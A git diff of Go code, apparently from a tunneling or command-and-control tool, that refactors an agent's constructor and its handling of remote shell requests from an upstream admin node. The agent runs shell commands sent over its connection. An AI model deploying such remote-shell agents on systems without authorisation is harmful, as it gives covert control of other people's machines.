@@ -2,7 +2,7 @@
  * @Author: ph4ntom
  * @Date: 2021-03-10 15:27:30
  * @LastEditors: ph4ntom
- * @LastEditTime: 2021-03-19 16:57:07
+ * @LastEditTime: 2021-03-20 13:41:47
  */
 
 package process
@@ -25,10 +25,12 @@ type Agent struct {
 	UserOptions  *initial.Options
 }
 
-func (agent *Agent) Prepare(options *initial.Options) {
+func NewAgent(options *initial.Options) *Agent {
+	agent := new(Agent)
 	agent.ID = protocol.TEMP_UUID
 	agent.CryptoSecret, _ = crypto.KeyPadding([]byte(options.Secret))
 	agent.UserOptions = options
+	return agent
 }
 
 func (agent *Agent) Run() {
@@ -62,7 +64,7 @@ func (agent *Agent) sendMyInfo() {
 
 func (agent *Agent) handleDataFromUpstream() {
 	rMessage := protocol.PrepareAndDecideWhichRProto(agent.Conn, agent.UserOptions.Secret, agent.ID)
-	sMessage := protocol.PrepareAndDecideWhichSProto(agent.Conn, agent.UserOptions.Secret, agent.ID)
+	//sMessage := protocol.PrepareAndDecideWhichSProto(agent.Conn, agent.UserOptions.Secret, agent.ID)
 	shell := handler.NewShell()
 	mySSH := handler.NewSSH()
 
@@ -78,26 +80,7 @@ func (agent *Agent) handleDataFromUpstream() {
 			agent.Memo = message.Memo
 		case protocol.SHELLREQ:
 			// No need to check member "start"
-			var shellResMess protocol.ShellRes
-			header := protocol.Header{
-				Sender:      agent.ID,
-				Accepter:    protocol.ADMIN_UUID,
-				MessageType: protocol.SHELLRES,
-				RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
-				Route:       protocol.TEMP_ROUTE,
-			}
-			if err := shell.Init(); err != nil {
-				shellResMess = protocol.ShellRes{
-					OK: 0,
-				}
-			} else {
-				shellResMess = protocol.ShellRes{
-					OK: 1,
-				}
-				go shell.Run(agent.Conn, agent.ID, agent.UserOptions.Secret)
-			}
-			protocol.ConstructMessage(sMessage, header, shellResMess)
-			sMessage.SendMessage()
+			go shell.Start(agent.Conn, agent.ID, agent.UserOptions.Secret)
 		case protocol.SHELLCOMMAND:
 			message := fMessage.(*protocol.ShellCommand)
 			shell.Input(message.Command)
